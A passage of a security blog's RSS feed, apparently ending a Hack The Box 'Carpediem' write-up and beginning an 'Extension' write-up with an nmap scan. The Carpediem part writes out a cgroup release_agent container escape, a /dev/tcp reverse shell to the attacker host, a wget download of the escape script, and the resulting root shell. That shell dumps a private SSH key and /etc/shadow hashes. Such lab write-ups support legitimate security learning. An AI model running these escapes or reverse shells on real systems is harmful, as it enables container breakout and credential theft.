background-color: null;
font-style: inherit;"># If you have a "Read-only file system" error, you need to use the next PoC</span></span>
<span id="cb44-11"></span>
<span id="cb44-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Finds path of OverlayFS mount for container</span></span>
<span id="cb44-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Unless the configuration explicitly exposes the mount point of the host filesystem</span></span>
<span id="cb44-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span></span>
<span id="cb44-15"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">t</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sed</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'s/overlay \/ .*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span></span>
<span id="cb44-16"></span>
<span id="cb44-17"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Sets release_agent to /path/payload</span></span>
<span id="cb44-18"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">touch</span> /o<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$t</span>/c <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$d</span>/release_agent</span>
<span id="cb44-19"></span>
<span id="cb44-20"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Creates a payload</span></span>
<span id="cb44-21"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"#!/bin/sh"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /c</span>
<span id="cb44-22"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ps &gt; </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$t</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/o"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /c</span>
<span id="cb44-23"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> +x /c</span>
<span id="cb44-24"></span>
<span id="cb44-25"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Triggers the cgroup via empty cgroup.procs</span></span>
<span id="cb44-26"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"echo 0 &gt; </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/w/cgroup.procs"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 1</span>
<span id="cb44-27"></span>
<span id="cb44-28"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Reads the output</span></span>
<span id="cb44-29"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /o</span>
<span id="cb44-30"></span>
<span id="cb44-31"></span>
<span id="cb44-32"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># wget http://10.10.14.10/esc.sh</span></span>
<span id="cb44-33"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># chmod +x esc.sh</span></span>
<span id="cb44-34"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># bash esc.sh</span></span>
<span id="cb44-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mkdir:</span> cannot create directory <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/sys/fs/cgroup/rdma/w'</span>: Read-only file system</span>
<span id="cb44-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">esc.sh:</span> line 11: /sys/fs/cgroup/rdma/w/notify_on_release: No such file or directory</span>
<span id="cb44-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">esc.sh:</span> line 20: /sys/fs/cgroup/rdma/release_agent: Read-only file system</span>
<span id="cb44-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sh:</span> 1: cannot create /sys/fs/cgroup/rdma/w/cgroup.procs: Directory nonexistent</span></code></pre></div>
<p>After a bit more investigating I come across <a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492">this post</a> about CVE-2022-0492 explaining how we can create new user namespace and cgroup namespace using <code>unshare -UrmC bash</code>, and then be able to mount the cgroupfs.</p>
<blockquote class="blockquote">
<p><em>“.. in the container we execute unshare to create new user namespace and cgroup namespace. Then we can mount the cgroupfs and write our data to release_agent.”</em></p>
</blockquote>
<p>So lets jump back to the first escape from Blackhat, this time using <code>unshare</code> to create new namespaces.</p>
<div class="sourceCode" id="cb45" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># wget http://10.10.14.10/esc.sh</span></span>
<span id="cb45-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># chmod +x esc.sh</span></span>
<span id="cb45-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># cat esc.sh</span></span>
<span id="cb45-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> /tmp/esc</span>
<span id="cb45-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mount</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> cgroup <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> rdma cgroup /tmp/esc</span>
<span id="cb45-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> /tmp/esc/w</span>
<span id="cb45-7"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> 1 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /tmp/esc/w/notify_on_release</span>
<span id="cb45-8"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pop</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$overlay</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/shell.sh"</span></span>
<span id="cb45-9"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4400 0&gt;&amp;1"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /shell.sh</span>
<span id="cb45-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> +x /shell.sh</span>
<span id="cb45-11"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pop</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /tmp/esc/release_agent</span>
<span id="cb45-12"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 5 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/tmp/esc/w/cgroup.procs <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span></span>
<span id="cb45-13"></span>
<span id="cb45-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># unshare -UrmC bash</span></span>
<span id="cb45-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">bash</span> esc.sh</span></code></pre></div>
<p>Nothing happens.. I really don’t understand the <code>$overlay</code> part, echoing it returns nothing. Investigating this further we find another, very similar, <a href="https://blog.aquasec.com/threat-alert-container-escape">PoC</a>: <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem23.png" class="img-fluid"></p>
<p>With some trial-and-error I got the escape working, for me the issue was my payload - so make sure to test it before incorporating it to a exploit.</p>
<div class="sourceCode" id="cb46" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb46-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># unshare -UrmC bash</span></span>
<span id="cb46-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">wget</span> http://10.10.14.10/esc.sh</span>
<span id="cb46-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> +x esc.sh</span>
<span id="cb46-4"></span>
<span id="cb46-5"></span>
<span id="cb46-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> esc.sh</span>
<span id="cb46-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> /tmp/cgrp <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mount</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> cgroup <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> rdma cgroup /tmp/cgrp <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> /tmp/cgrp/x</span>
<span id="cb46-8"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> 1 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /tmp/cgrp/x/notify_on_release</span>
<span id="cb46-9"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">host_path</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sed</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span></span>
<span id="cb46-10"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$host_path</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/cmd"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /tmp/cgrp/release_agent</span>
<span id="cb46-11"></span>
<span id="cb46-12"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'#!/bin/sh'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /cmd</span>
<span id="cb46-13"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/4400 0&gt;&amp;1'"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /cmd</span>
<span id="cb46-14"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> a+x /cmd</span>
<span id="cb46-15"></span>
<span id="cb46-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"echo </span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\$\$</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> &gt; /tmp/cgrp/x/cgroup.procs"</span></span>
<span id="cb46-17"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">head</span> /output</span>
<span id="cb46-18"></span>
<span id="cb46-19"></span>
<span id="cb46-20"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">bash</span> esc.sh</span></code></pre></div>
<div class="sourceCode" id="cb47" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb47-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4400            </span>
<span id="cb47-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4400 ...</span>
<span id="cb47-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.167]</span> 56780</span>
<span id="cb47-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb47-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb47-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@carpediem:/#</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb47-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb47-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">carpediem</span></span>
<span id="cb47-9"></span>
<span id="cb47-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@carpediem:/#</span> cat /root/root.txt</span>
<span id="cb47-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c57deb2eb7b17c84a0e40dc099b0bb70</span></span>
<span id="cb47-12"></span>
<span id="cb47-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@carpediem:/#</span> cat /root/.ssh/id_rsa</span>
<span id="cb47-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb47-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
<span id="cb47-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NhAAAAAwEAAQAAAYEAn4XMDVkBUi5Cch7+bhxOLQzqofUIElWw6wNQ2MNZIi3QTUYE0cSn</span></span>
<span id="cb47-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rCrrVSGKt1BRWrXlNjanoGJGvfENm02L+Dm9dUPbFaJjcFBG80DjrWsVfkCYSwe3g9KjCk</span></span>
<span id="cb47-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">kqXrHXtapCgERNCga82snoEgYN3z9vmsrw/nd2D6OVsQxkIck7bzC2+p2EinjhaY9BVtO0</span></span>
<span id="cb47-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UVkcDrMBvRq64JOkHHktYEBF95SDRHav1JW6M/wY6lan18Zfrc2x0c+Ktavpp6KwHVXOcJ</span></span>
<span id="cb47-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">veuChxMfbWOgyaubMV57iZ828vloyoUZRy4OlZr0Jxe5FQGcxWT2/nhWKU3uo4Vi/mSWha</span></span>
<span id="cb47-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hNMY8s+ip7y9lJZZ4/ZnN0nkkriO5xWwJu4+FEwDM9a2ZVbpfRAqcCNVQR5atHaGLl3pM6</span></span>
<span id="cb47-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LDpyN9i95ks03BOo/9U6SULuWK/IfQjzlCLP28EJBb6W5cMBvB+yZSAGJ15fKYv2+9c4dj</span></span>
<span id="cb47-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">JLefRpTq65BzjwUIxseflmyTL08WYGzSB9amCsHzAAAFiCMHoVMjB6FTAAAAB3NzaC1yc2</span></span>
<span id="cb47-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EAAAGBAJ+FzA1ZAVIuQnIe/m4cTi0M6qH1CBJVsOsDUNjDWSIt0E1GBNHEp6wq61UhirdQ</span></span>
<span id="cb47-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UVq15TY2p6BiRr3xDZtNi/g5vXVD2xWiY3BQRvNA461rFX5AmEsHt4PSowpJKl6x17WqQo</span></span>
<span id="cb47-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">BETQoGvNrJ6BIGDd8/b5rK8P53dg+jlbEMZCHJO28wtvqdhIp44WmPQVbTtFFZHA6zAb0a</span></span>
<span id="cb47-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uuCTpBx5LWBARfeUg0R2r9SVujP8GOpWp9fGX63NsdHPirWr6aeisB1VznCb3rgocTH21j</span></span>
<span id="cb47-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">oMmrmzFee4mfNvL5aMqFGUcuDpWa9CcXuRUBnMVk9v54VilN7qOFYv5kloWoTTGPLPoqe8</span></span>
<span id="cb47-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vZSWWeP2ZzdJ5JK4jucVsCbuPhRMAzPWtmVW6X0QKnAjVUEeWrR2hi5d6TOiw6cjfYveZL</span></span>
<span id="cb47-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NNwTqP/VOklC7livyH0I85Qiz9vBCQW+luXDAbwfsmUgBideXymL9vvXOHYyS3n0aU6uuQ</span></span>
<span id="cb47-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c48FCMbHn5Zsky9PFmBs0gfWpgrB8wAAAAMBAAEAAAGAMg6VIlccoAIeHZt2MW02ZtKXye</span></span>
<span id="cb47-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">yO9Nno40YuF2btUFlZ9PWUy5JPHyp0oEkfMzjD3pgXbfSmkyBjnHTI1UP3ORQ9TE/Xrqk/</span></span>
<span id="cb47-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">VN4L9YcWKrPgkbaJU3n/byEowjCFWCOsUbg0l/VWy1+j4W/cH9PAhJ5uUf9+sgsgg/XMIj</span></span>
<span id="cb47-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uGLEfuG40IzgmhrqYR7cLjOPDDs4cn08D+Oa3qmFAb/kdUItDoY7E5o8EumaHGRUvFMbux</span></span>
<span id="cb47-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fXclTO+v7euXVjy03EKjTCL9poucY51N9XXPzqWnMq+2e2ajQwbURSsWJ8TpvHy/0eDfUJ</span></span>
<span id="cb47-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">kyOMSNAtouZczSsipukJehuoMgn169HoIHNov1mx6n5clSBhmkAAcyXqqIoW/Qh/7HYWa+</span></span>
<span id="cb47-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">k0t/CKrG166DJ+DGPZbWQhWAepEKkD2QXDFJB2nY0j46InBRaKSyyqId5CKRmjQy8WuqtM</span></span>
<span id="cb47-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NuCn623pVXUWrsEvWeVp881h1f2t8ZBHl09mFBNTBCfnwu5Y68HQhn3biU8Zmajk5xAAAA</span></span>
<span id="cb47-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wByZ9i3MAdkAeBO59jhWcB7G14KXvlo2jyr0ZStsMH/on63EZJo6t2uLnzq7WFkY3fqf6v</span></span>
<span id="cb47-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Tdp1ba9WA9RINMp5yd5BnITcees+VnoWQGJ3DjYXdUSES5dBejxOHoNCzF8QG7MAVnMCe+</span></span>
<span id="cb47-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">yyrGyMW1sKnWWQJW9Ni6HEPDKnvj/hYZBI6OKST/Pebcz8lRfMgbOsb9GheaDL6zEx9KX/</span></span>
<span id="cb47-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7y0HYBjm8VK9nzBjKRfnVpfBjBrQeD43YiRt+HB1a8C4ZGTQAAAMEAz1X60hD50s4/CBlh</span></span>
<span id="cb47-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">A8Hw62Zpqqpb7eMmqRr2nLc4u/8T3aPwS9YxgoYh9S/R2WCZdujT0xVacNNJ86S/QiNefq</span></span>
<span id="cb47-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrA5JoTS8cFB0ysqCzJeoOn109tyowui4Vv4iptx+id+u0l/FazLwXTVZJJeks3WSI3OmS</span></span>
<span id="cb47-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PnWQwB1vF3hrEe8LP55GEl4Jh+FiyP6WNup9satmGzcGCyKd0txwenq4PsYJ+uSNrPH/Hi</span></span>
<span id="cb47-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s89hVBwEeVkkTDP0rBc4IEQ1V/1Gt5AAAAwQDE9udhbjBnmmKHOv3G7FG9+xjGLCwZqZIy</span></span>
<span id="cb47-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AU57jRp1TOjVm0DSnGyUhqb79tkWCjd4OVnrFQpE/yKiynvVNPoynwc9mIoM+QO3UF7ZXl</span></span>
<span id="cb47-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+PKqszyJiYywpHZAmZXm8f5/Kol+R/2SI7sPlq4ripwiOv8F5CwoP/kf2Dgl9ryCCvo+lL</span></span>
<span id="cb47-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">siB8rSQLuY6TXBfs+IZfggGO8Xn1JZWaF7J68DjWXo8GNdwwjdpjnoFxmBU3cEZYFjbjYB</span></span>
<span id="cb47-50"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">okkXD85q0KkcsAAAAOcm9vdEBjYXJwZWRpZW0BAgMEBQ</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>=</span>
<span id="cb47-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb47-52"></span>
<span id="cb47-53"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@carpediem:/#</span> cat /etc/shadow</span>
<span id="cb47-54"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:19081:0:99999:7:::</span></span>
<span id="cb47-55"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$Y3pKa50HWcGkr</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/KE</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/QRX7wSgNT/XekUYEx</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>web</category>
  <category>docker</category>
  <category>tunneling</category>
  <category>pivot</category>
  <category>mongodb</category>
  <category>void</category>
  <category>pcap</category>
  <category>release_agent</category>
  <guid>https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/2022-09-14-htb-writeup-carpediem.html</guid>
  <pubDate>Wed, 14 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Extension - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-11-htb-writeup-extension/2022-09-11-htb-writeup-extension.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.171 </span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> Nmap 7.92 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://nmap.org</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> 2022-09-07 15:49 CEST</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nmap</span> scan report for 10.10.11.171</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> is up <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.025s</span> latency<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> shown: 65533 closed tcp ports <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn-refused</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
